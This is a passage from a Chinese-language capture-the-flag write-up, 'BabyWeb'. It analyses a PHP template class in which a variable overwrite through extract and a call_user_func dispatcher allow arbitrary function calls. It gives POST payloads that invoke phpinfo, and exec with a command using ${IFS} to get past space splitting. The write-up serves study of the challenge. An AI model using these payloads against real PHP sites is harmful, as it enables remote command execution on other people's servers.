class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br><br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getTempName</span>(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;template);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>&#123;<br>        <span class="hljs-variable">$system</span> = [<br>            <span class="hljs-string">&#x27;db&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;app&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;num&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;sum&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;form&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;page&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;not_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;show_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;more&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;catid&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;field&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;order&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;space&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;table&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;table_site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;total&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;join&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;on&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;return&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;sbpage&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;urlrule&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;pagesize&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;pagefile&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br><br>        <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];<br><br>        <span class="hljs-variable">$_params</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_params</span>);<br><br>        <span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$_params</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;function&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;action=&#x27;</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) &#123;<br>            <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>));<br>            <span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) &#123; <br>                <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>; <br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// action</span><br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125;<br><br>                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                    <span class="hljs-variable">$p</span> = [];<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br><br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来分析代码结构</p><p>开始的地方在创建了Temp类，并且调用了display方法</p><p><img src="/2022/12/06/BabyWeb/image-20221206164339317.png" alt="image-20221206164339317"></p><p>创建类以后，第一步会将post请求传入的参数赋值到$data里面，然后和$this-&gt;data合并成一个数组</p><p><img src="/2022/12/06/BabyWeb/image-20221206164345744.png" alt="image-20221206164345744"></p><p>合并到一个数组以后，调用display方法，这里也就是变量覆盖的位置了</p><p><img src="/2022/12/06/BabyWeb/image-20221206164351684.png" alt="image-20221206164351684"></p><p>接着步入进去getTempName方法</p><p>dir等于admin的话，会将$template进行一个检测，不能有..出现，否则替换成空，并赋值给$this-&gt;template</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据上面我们知道了一个新的路径&#x2F;template&#x2F;admin，访问一下看看</p><p><img src="/2022/12/06/BabyWeb/image-20221206164359542.png" alt="image-20221206164359542"></p><p>可以看见这里又调用了listdata方法</p><p>根据目前所得到的信息，也能猜到，这是让我们要进入&#x2F;template&#x2F;admin这个路径里调用listdata方法</p><hr><p><strong>那么思路就来了，首先，post传参通过变量覆盖将space赋值成admin,get传参通过filename赋值成index.html，这样就可以进入&#x2F;template&#x2F;admin&#x2F;index.html这个路径了</strong></p><hr><p>接着我们再看listdata方法里都有什么东西</p><p>$system这个数组可以省略不看，我只说几个稍微关键一点的地方</p><p>这里的判断，我们是需要绕过的，$params[0]不能等于function，$params[0]这个位置我们需要它等于mod,所以这里我们待会可以随意传入一个值进去</p><p><img src="/2022/12/06/BabyWeb/image-20221206164407656.png" alt="image-20221206164407656"></p><p>这里是遍历新的数组</p><p><img src="/2022/12/06/BabyWeb/image-20221206164414361.png" alt="image-20221206164414361"></p><p>下面来到了关键的环节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125;<br><br>                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                    <span class="hljs-variable">$p</span> = [];<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br><br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>$system[‘action’]里的值是function就会进入下面的判断</p><p>name值不能为空，name传进去的函数如果是已定义的，会返回true，然后就可以绕过了</p><p><img src="/2022/12/06/BabyWeb/image-20221206164423863.png" alt="image-20221206164423863"></p><p>再往下面走</p><p>判断$param[‘force’]必须要什么值都没有，不过$param数组里没有force这个键，所以直接也就进去了，foreach遍历param数组，判断键里面有没有param，没有，所以这个循环也没啥用。再往下走，判断p，如果有值，调用call_user_func_array，如果没有值调用call_user_func</p><p><img src="/2022/12/06/BabyWeb/image-20221206164429596.png" alt="image-20221206164429596"></p><p>一共两种方法，我们一一介绍一下</p><p>第一种</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">get: filename=index.html<br>post: space=admin&amp;mod=<span class="hljs-number">12345</span> action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">phpinfo</span></span><br></code></pre></td></tr></table></figure><hr><p><img src="/2022/12/06/BabyWeb/image-20221206164438293.png" alt="image-20221206164438293"></p><p>然后在phpinfo里找到了flag</p><p><img src="/2022/12/06/BabyWeb/image-20221206164443698.png" alt="image-20221206164443698"></p><p>第二种</p><p>根据上面的phpinfo里面的disable_functions可以发现exec并没有被禁用<br>那么这一次我们需要在p赋值的那里进行一下改变了，name要等于exec，再新添加一个param等于我们要执行的命令</p><p><img src="/2022/12/06/BabyWeb/image-20221206164450335.png" alt="image-20221206164450335"></p><p>（这里循环解释一下，$param数组里如果找到param这个键便能进行下面的给p数组赋值的环节，$n什么也没有，关键的地方就是在于因为有了新的传参，有了param，所以param也就会被传入$p里）</p><p>下面开始构造payload，但是要主要的是，之前分割数组的时候，是以空格进行分割的，所以待会我们需要使用${IFS}进行绕过</p><p><img src="/2022/12/06/BabyWeb/image-20221206164455952.png" alt="image-20221206164455952"></p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">get:  filename=index.html<br>post: space=admin&amp;mode=<span class="hljs-number">2134</span> action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">exec</span> <span class="hljs-title">param</span>=<span class="hljs-title">ls</span>$</span>&#123;IFS&#125;/&gt;/<span class="hljs-keyword">var</span>/www/html/a<br></code></pre></td></tr></table></figure><hr><p><img src="/2022/12/06/BabyWeb/image-20221206164502176.png" alt="image-20221206164502176"></p><p><img src="/2022/12/06/BabyWeb/Users\林白\Desktop\md\img\image-20221206160100569.png" alt="image-20221206160100569"></p><p>查看根目录</p><p><img src="/2022/12/06/BabyWeb/image-20221206164530756.png" alt="image-20221206164530756"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164512507.png" alt="image-20221206164512507"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164540320.png" alt="image-20221206164540320"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164545355.png" alt="image-20221206164545355"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
